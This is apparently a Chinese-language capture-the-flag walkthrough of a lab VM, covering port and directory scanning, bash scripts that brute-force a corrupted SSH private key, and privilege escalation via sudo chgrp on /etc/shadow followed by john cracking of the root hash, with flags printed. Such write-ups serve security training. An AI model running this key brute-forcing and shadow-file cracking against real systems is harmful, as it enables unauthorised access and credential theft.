> ⏲️ Release Date // 2021-10-20
>
> ✔️ MD5 // f9f5956724247267946fce4d78ac1e4e
>
> ☠ Root // 117
>
> 💀 User // 115

### 主机探测和nmap扫描

全端口扫描

```bash
nmap -sT --min-rate 8000 -p- 192.168.56.128
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

指定端口扫描

```bash
nmap -sT -sV -sC -O -p22,80 192.168.56.128
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:f1:ed:84:cc:41:8c:7e:c6:92:a9:b4:29:57:bf:d1 (RSA)
|   256 9f:f3:93:db:72:ff:cd:4d:5f:09:3e:dc:13:36:49:23 (ECDSA)
|_  256 e7:a3:72:dd:d5:af:e2:b5:77:50:ab:3d:27:12:0f:ea (ED25519)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Cours PHP & MySQ
```

### web渗透

访问web页面

> Under construction...
>
> but not empty

#### 目录扫描

```bash
gobuster dir -u http://192.168.56.128 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,txt
```

```
/.php                 (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
/sshnote.txt          (Status: 200) [Size: 117]
```

访问`/sshnote.txt`

> My RSA key is messed up, it looks like 3 capital letters have been replaced by stars.
> Can you try to fix it?
>
> sophie

发现一个人名`sophie`，告诉我们`id_rsa`的三个大写字母被`*`代替

查看cookie

> cG9pc29uZWRnaWZ0LnR4dA==

`base64`解码得到`poisonedgift.txt`

访问得到私钥,发现三个字母没了

![image-20240528221147993](https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20240528221147993.png)

### 爆破key

生成三个大写字母的组合

```bash
crunch 3 3 ABCDEFGHIJKLMNOPQRSTUVWXYZ > capital.txt
```

```bash
#!/bin/bash

KEYS4DIRECTORY=keys
LETTERS=capital.txt
CORRUPT_KEY=id_rsa

mkdir -p $KEYS4DIRECTORY

for i in $(cat $LETTERS);do
echo $i
clear
sed "s/\*\*\*/$i/" $CORRUPT_KEY > $KEYS4DIRECTORY/$i.rsa
done;
```

### 登录ssh服务

```bash
#!/bin/bash

KEYS4DIRECTORY=keys
LETTERS=capital.txt

echo 设置权限
chmod 600 $KEYS4DIRECTORY/*

echo 检查key

for i in $(ls -1 $KEYS4DIRECTORY/*); do
ssh -i $i sophie@192.168.56.128
echo $i
done
```

```bash
sophie@debian:~$ cat user.txt 
a99ac9055a3e60a8166cdfd746511852
```

```bash
sophie@debian:~$ sudo -l
Matching Defaults entries for sophie on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sophie may run the following commands on debian:
    (ALL : ALL) NOPASSWD: /usr/bin/chgrp
```

### 提权

> chgrp可以修改目录和文件的所属组

将shadow文件改为sophie组

```bash
sudo chhgrp sophie /etc/shadow
```

爆破root的hash

```
root:$1$root$dZ6JC474uVpAeG8g0oh/7.:18917:0:99999:7:::
```

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

> root:barbarita:18917:0:99999:7:::

提权成功，拿到root.txt

```bash
root@debian:~# cat root.txt 
bf3b0ba0d7ebf3a1bf6f2c452510aea2
```

